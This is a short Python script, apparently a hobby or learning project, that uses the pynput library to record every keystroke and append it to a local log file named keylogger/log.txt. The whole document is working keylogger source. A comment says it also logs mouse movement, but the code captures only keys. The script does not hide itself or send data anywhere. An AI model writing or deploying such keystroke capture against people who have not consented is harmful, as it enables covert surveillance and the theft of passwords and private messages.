from pynput.keyboard import Listener
# Note: pynput cannot control the keyboard and mouse within the same file, this requires double imports

# Program stores key strokes and mouse movement within log file

# Append function
def appendtofile(key):
    # Variable holding keyboard input
    letter = str(key)

    # Replacing single quotes to create clean data
    letter = letter.replace("'",'')

    # Replacing common non-letter key presses
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == 'Key.shift_l':
        letter = ''
    
    # Appending
    with open('keylogger/log.txt','a') as f:
        f.write(letter)



with Listener(on_press=appendtofile) as l:
    l.join()

